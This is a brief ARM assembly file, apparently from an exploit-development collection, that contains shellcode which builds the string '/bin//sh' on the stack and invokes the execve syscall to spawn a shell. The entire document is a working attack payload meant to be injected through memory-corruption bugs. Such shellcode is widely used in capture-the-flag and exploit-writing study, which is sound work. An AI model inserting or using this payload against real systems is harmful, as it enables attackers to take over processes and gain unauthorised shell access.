;;;
;;; ARM sys_exec("/bin/sh") shellcode
;;;
;;; @_hugsy_
;;;
ldr r0, =0x2f62696e
str r0, [sp]
ldr r0, =0x2f2f7368
str r0, [sp, 4]
mov r0, sp
mov r1, 0
mov r2, 0
mov r7, __NR_SYS_execve
svc 0
wfi
